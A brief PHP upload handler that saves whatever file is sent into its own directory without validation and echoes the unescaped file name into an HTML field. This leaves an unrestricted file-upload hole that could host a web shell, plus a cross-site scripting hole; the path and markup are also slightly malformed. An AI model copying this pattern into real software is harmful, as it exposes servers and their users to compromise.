<?php
$source = $_FILES['rfile']['tmp_name'];
$dest =  "./ ".basename($_FILES['rfile']['name']);
move_uploaded_file($source, $dest);
?>
	<!doctype html>
		<html>
			<head>
				<meta charset="utf-8">
				<title></title>
			</head>
			<body>
				<input type="text" name="code" value="<?=$_FILES['rfile']['name']?>"alt=""/>
			</body>
		</html>